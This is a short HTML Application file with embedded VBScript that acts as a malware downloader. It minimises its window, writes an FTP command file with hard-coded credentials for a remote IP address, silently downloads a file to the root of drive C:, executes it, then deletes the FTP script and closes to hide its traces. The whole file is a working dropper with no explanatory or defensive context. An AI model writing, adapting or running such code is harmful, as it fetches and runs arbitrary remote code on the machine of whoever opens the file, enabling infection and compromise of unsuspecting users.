<html>
<HTA:APPLICATION caption="no" border="none" showInTaskBar="yes" windowState="minimize">
<object id='wsh' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object>
<script language="VBScript">
Dim fs, t 
Set fs = CreateObject("Scripting.FileSystemObject")
Set t = fs.CreateTextFile("ftp.txt",True)
t.WriteLine("open 220.114.168.5")
t.WriteLine("user01")
t.WriteLine("pass00")
t.WriteLine("bin")
t.WriteLine("lcd c:\")
t.WriteLine("get 123")
t.WriteLine("bye")
t.Close
wsh.Run "ftp -s:ftp.txt",0,true
wsh.Run "c:\123"
fs.DeleteFile "ftp.txt",true
window.close
</script> 
<html>